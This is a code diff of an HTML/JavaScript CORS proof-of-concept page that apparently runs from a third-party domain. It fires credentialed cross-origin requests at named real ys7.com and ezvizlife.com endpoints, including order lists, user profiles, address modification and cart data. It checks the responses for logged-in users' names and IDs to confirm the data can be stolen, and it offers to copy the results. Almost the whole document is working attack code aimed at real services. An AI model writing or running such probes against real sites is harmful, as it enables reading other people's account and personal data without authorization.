@@ -2,29 +2,50 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<title>CORS PoC - cart.ys7.com</title>
+<title>CORS PoC - ys7.com / cart.ys7.com</title>
 <style>
   body { font-family: Consolas, monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }
-  h1 { color: #4ec9b0; font-size: 18px; }
+  h1 { color: #4ec9b0; font-size: 20px; }
+  h2 { color: #569cd6; font-size: 16px; margin-top: 24px; }
   .box { background: #252526; border: 1px solid #3e3e42; padding: 12px; margin: 10px 0; border-radius: 4px; }
   .ok { color: #4ec9b0; }
   .err { color: #f48771; }
   .warn { color: #dcdcaa; }
+  .info { color: #9cdcfe; }
   pre { white-space: pre-wrap; word-break: break-all; margin: 6px 0; }
   .label { color: #569cd6; font-weight: bold; }
+  .verdict { font-size: 15px; font-weight: bold; padding: 8px; margin-top: 8px; border-radius: 3px; }
+  .red { background: #5a1d1d; color: #f48771; }
+  .gray { background: #2d2d30; color: #808080; }
+  .yellow { background: #4d4a1f; color: #dcdcaa; }
+  button { background: #0e639c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; border-radius: 3px; margin: 8px 4px 0 0; }
+  button:hover { background: #1177bb; }
+  #summary { border: 2px solid #4ec9b0; }
 </style>
 </head>
 <body>
 
-<h1>CORS PoC — cart.ys7.com</h1>
+<h1>CORS PoC — ys7.com</h1>
 
 <div class="box">
-  <span class="label">当前页面 Origin：</span>
-  <span id="pageOrigin"></span>
+  <div><span class="label">PoC 页面 Origin：</span> <span id="pageOrigin"></span></div>
+  <div><span class="label">协议：</span> <span id="protocol"></span></div>
+  <div><span class="label">时间：</span> <span id="ts"></span></div>
 </div>
 
 <div class="box">
-  <span class="label">测试目标：</span> https://cart.ys7.com/cartBrief/queryCartResume
+  <span class="label">⚠️ 前置条件：</span><br>
+  1. 用<b>已登录 www.ys7.com 的浏览器</b>打开本页面<br>
+  2. 本页面是 <code>http://qss.abrdns.com/</code>，与目标 <code>https://www.ys7.com</code> <b>不同源</b><br>
+  3. 如果 ys7 cookie 是 <code>SameSite=None; Secure</code>，<b>HTTP 页面带不上</b>（需 HTTPS）<br>
+</div>
+
+<button onclick="runAll()">▶ 开始测试</button>
+<button onclick="copyResult()">📋 复制全部结果</button>
+
+<div id="summary" class="box" style="display:none;">
+  <span class="label">总结：</span>
+  <div id="summaryContent"></div>
 </div>
 
 <div id="results"></div>
@@ -32,89 +53,205 @@
 <script>
 const out = document.getElementById('results');
 document.getElementById('pageOrigin').textContent = location.origin;
+document.getElementById('protocol').textContent = location.protocol;
+document.getElementById('ts').textContent = new Date().toISOString();
+
+const allLogs = [];
 
 function log(label, cls, content) {
   const d = document.createElement('div');
   d.className = 'box';
   d.innerHTML = '<span class="label">' + label + '</span><pre class="' + (cls||'') + '">' + content + '</pre>';
   out.appendChild(d);
+  allLogs.push('[' + label + ']\n' + content + '\n');
 }
 
-// 测试 1：不带 credentials
-async function testNoCreds() {
-  try {
-    const r = await fetch('https://cart.ys7.com/cartBrief/queryCartResume', {
-      method: 'POST',
-      credentials: 'omit',
-      headers: {'Content-Type': 'application/json'},
-      body: '{}'
-    });
-    const t = await r.text();
-    log('测试1：credentials=omit（不带 cookie）', 'warn',
-        'HTTP ' + r.status + '\n' + t.slice(0, 500));
-  } catch (e) {
-    log('测试1：credentials=omit', 'err', 'ERR: ' + e.message);
-  }
-}
+// ===== 测试目标 =====
+const TARGETS = [
+  // cart 购物车（之前可疑）
+  { name: 'cart.ys7.com/cartBrief/queryCartResume', url: 'https://cart.ys7.com/cartBrief/queryCartResume', method: 'POST', body: '{}', ct: 'application/json' },
+  // www 商城
+  { name: 'www.ys7.com/order/list.html', url: 'https://www.ys7.com/order/list.html', method: 'GET' },
+  { name: 'www.ys7.com/cart/index.html', url: 'https://www.ys7.com/cart/index.html', method: 'GET' },
+  { name: 'www.ys7.com/user/index.html', url: 'https://www.ys7.com/user/index.html', method: 'GET' },
+  { name: 'www.ys7.com/order/address-modify.html', url: 'https://www.ys7.com/order/address-modify.html', method: 'GET' },
+  // api
+  { name: 'api.ys7.com/v3/users/publickey', url: 'https://api.ys7.com/v3/users/publickey', method: 'GET' },
+  // es 企业版
+  { name: 'es.ys7.com/api/user/front/web/config', url: 'https://es.ys7.com/api/user/front/web/config', method: 'POST', body: '{"clientType":1}', ct: 'application/json' },
+  // sapartner 服务商
+  { name: 'sapartner.ezvizlife.com/napi/common/areaList', url: 'https://sapartner.ezvizlife.com/napi/common/areaList', method: 'GET' },
+];
 
-// 测试 2：带 credentials（关键！）
-async function testWithCreds() {
+// ===== 单个测试 =====
+async function testOne(t, withCreds) {
+  const start = Date.now();
   try {
-    const r = await fetch('https://cart.ys7.com/cartBrief/queryCartResume', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {'Content-Type': 'application/json'},
-      body: '{}'
-    });
-    const t = await r.text();
-    let isVisitor = t.includes('"visitor":true');
-    let isLoggedIn = t.includes('"visitor":false');
-    let userMatch = t.match(/"userName":"([^"]*)"/);
-    let idMatch = t.match(/"userId":"([^"]*)"/);
-
-    let verdict = '';
-    let cls = 'warn';
-    if (isLoggedIn && userMatch && userMatch[1]) {
-      verdict = '\n\n🔴 漏洞成立！读到登录用户数据：';
-      verdict += '\n   userName = ' + userMatch[1];
-      verdict += '\n   userId   = ' + (idMatch ? idMatch[1] : '');
-      cls = 'err';
-    } else if (isVisitor) {
-      verdict = '\n\n⚪ 未带上 cookie（visitor:true）—— CORS 不可利用或 cookie SameSite 阻止';
-      cls = 'ok';
+    const opts = {
+      method: t.method,
+      credentials: withCreds ? 'include' : 'omit',
+      headers: {},
+      mode: 'cors'
+    };
+    if (t.body) {
+      opts.headers['Content-Type'] = t.ct || 'application/json';
+      opts.body = t.body;
     }
-
-    log('测试2：credentials=include（带 cookie，关键）', cls,
-        'HTTP ' + r.status + '\n' + t.slice(0, 500) + verdict);
+    const r = await fetch(t.url, opts);
+    const txt = await r.text();
+    return {
+      ok: true,
+      status: r.status,
+      len: txt.length,
+      time: Date.now() - start,
+      body: txt,
+      acao: r.headers.get('access-control-allow-origin'),
+      acac: r.headers.get('access-control-allow-credentials')
+    };
   } catch (e) {
-    log('测试2：credentials=include', 'err',
-        'ERR: ' + e.message + '\n（CORS 被阻止，或网络失败）');
+    return { ok: false, err: e.message, time: Date.now() - start };
   }
 }
 
-// 测试 3：GET 一个只读接口
-async function testGet() {
-  try {
-    const r = await fetch('https://cart.ys7.com/', {
-      method: 'GET',
-      credentials: 'include'
-    });
-    const t = await r.text();
-    log('测试3：GET cart.ys7.com/', 'warn',
-        'HTTP ' + r.status + '\n长度: ' + t.length);
-  } catch (e) {
-    log('测试3：GET /', 'err', 'ERR: ' + e.message);
+// ===== 判断单个结果 =====
+function judge(t, noCred, withCred) {
+  let verdict = '';
+  let cls = 'warn';
+  let exploitable = false;
+
+  // 都失败
+  if (!noCred.ok && !withCred.ok) {
+    return { cls: 'gray', exploitable: false,
+             verdict: '⚪ 两个都失败（CORS 被拒 / 网络失败）\n不带: ' + noCred.err + '\n带: ' + withCred.err };
+  }
+
+  // 带 cookie 成功
+  if (withCred.ok) {
+    const b = withCred.body;
+    // 登录态数据
+    if (b.includes('"visitor":false') || b.includes('bzu32316f2') || /"userId":"\d{10,}"/.test(b)) {
+      exploitable = true;
+      cls = 'err';
+      verdict = '🔴 带 cookie 读到【登录用户数据】 → CORS 漏洞成立！';
+    }
+    // 游客
+    else if (b.includes('"visitor":true')) {
+      cls = 'ok';
+      verdict = '⚪ 带 cookie 仍是游客（visitor:true）\n' +
+                '   → cookie 没带上。\n' +
+                '   → 原因可能是：SameSite=Lax/Strict，或本页面 HTTP 导致 Secure cookie 不发';
+    }
+    // HTML 页面
+    else if (withCred.len > 500 && b.includes('<html')) {
+      cls = 'gray';
+      verdict = '⚪ 返回 HTML 页面（不是 JSON 数据）→ 无 CORS 利用价值';
+    }
+    // 其他
+    else if (withCred.len < 200) {
+      cls = 'yellow';
+      verdict = '🟡 返回内容短，可能不含敏感数据，需人工看：\n' + b.slice(0, 200);
+    } else {
+      cls = 'yellow';
+      verdict = '🟡 返回 ' + withCred.len + ' 字节，需人工判断是否含用户数据';
+    }
+  } else {
+    cls = 'gray';
+    verdict = '⚪ 带 cookie 请求失败（CORS 拒绝或网络问题）：' + withCred.err;
+  }
+
+  return { cls, exploitable, verdict };
+}
+
+// ===== 格式化 =====
+function fmt(t, noCred, withCred) {
+  let s = '';
+  s += '【不带 cookie (credentials:omit)】\n';
+  if (noCred.ok) {
+    s += '  HTTP ' + noCred.status + ' | len=' + noCred.len + ' | ' + noCred.time + 'ms\n';
+    s += '  ACAO=' + noCred.acao + ' | ACAC=' + noCred.acac + '\n';
+    s += '  body: ' + noCred.body.slice(0, 300).replace(/\n/g, ' ') + '\n';
+  } else {
+    s += '  ERR: ' + noCred.err + '\n';
+  }
+  s += '\n【带 cookie (credentials:include)】\n';
+  if (withCred.ok) {
+    s += '  HTTP ' + withCred.status + ' | len=' + withCred.len + ' | ' + withCred.time + 'ms\n';
+    s += '  ACAO=' + withCred.acao + ' | ACAC=' + withCred.acac + '\n';
+    s += '  body: ' + withCred.body.slice(0, 400).replace(/\n/g, ' ') + '\n';
+  } else {
+    s += '  ERR: ' + withCred.err + '\n';
+  }
+  return s;
+}
+
+// ===== 主流程 =====
+async function runAll() {
+  out.innerHTML = '';
+  allLogs.length = 0;
+  document.getElementById('summary').style.display = 'none';
+
+  log('前置检查', 'info', '页面 Origin = ' + location.origin + '\n协议 = ' + location.protocol);
+
+  if (location.protocol === 'http:') {
+    log('⚠️ 警告', 'warn',
+      '本页面是 HTTP。如果目标 cookie 是 SameSite=None; Secure，\n' +
+      '浏览器不会在 HTTP 页面发送 Secure cookie。\n' +
+      '→ 这种情况下测出 "visitor:true" 不代表漏洞不成立。\n' +
+      '→ 要用 HTTPS 源（如 GitHub Pages）才能准确判断。');
+  }
+
+  let exploitableCount = 0;
+  let results = [];
+
+  for (const t of TARGETS) {
+    log('=== ' + t.name + ' ===', 'warn', '测试中...');
+    const noCred = await testOne(t, false);
+    await new Promise(r => setTimeout(r, 500));  // 慢一点，避免高频
+    const withCred = await testOne(t, true);
+    await new Promise(r => setTimeout(r, 500));
+
+    const j = judge(t, noCred, withCred);
+    if (j.exploitable) exploitableCount++;
+
+    log('结果：' + t.name, j.cls, fmt(t, noCred, withCred) + '\n' + j.verdict);
+    results.push({ name: t.name, exploitable: j.exploitable, cls: j.cls, verdict: j.verdict });
+  }
+
+  // 总结
+  const sum = document.getElementById('summaryContent');
+  let shtml = '';
+  shtml += '<div class="verdict ' + (exploitableCount > 0 ? 'red' : 'gray') + '">';
+  shtml += '🔴 可利用：' + exploitableCount + ' 个 / ' + TARGETS.length + ' 个目标';
+  shtml += '</div>';
+  shtml += '<div style="margin-top:8px;">';
+  for (const r of results) {
+    shtml += '• ' + r.name + ' → ' + (r.exploitable ? '🔴 成立' : '⚪ 不成立') + '<br>';
+  }
+  shtml += '</div>';
+  sum.innerHTML = shtml;
+  document.getElementById('summary').style.display = 'block';
+
+  allLogs.push('\n===== 总结 =====\n可利用：' + exploitableCount + ' / ' + TARGETS.length + '\n');
+  for (const r of results) {
+    allLogs.push('• ' + r.name + ' → ' + (r.exploitable ? '成立' : '不成立'));
   }
 }
 
-(async () => {
-  await testNoCreds();
-  await testWithCreds();
-  await testGet();
-  log('说明', 'ok',
-      '测试2 是核心：如果显示 🔴，CORS 漏洞成立；\n' +
-      '如果显示 ⚪（visitor:true），说明 cookie 没带上（SameSite 阻止），漏洞不成立。');
-})();
+function copyResult() {
+  const txt = allLogs.join('\n');
+  navigator.clipboard.writeText(txt).then(() => {
+    alert('已复制 ' + txt.length + ' 字符到剪贴板');
+  }).catch(e => {
+    // 兜底
+    const ta = document.createElement('textarea');
+    ta.value = txt;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    alert('已复制');
+  });
+}
 </script>
 
 </body>
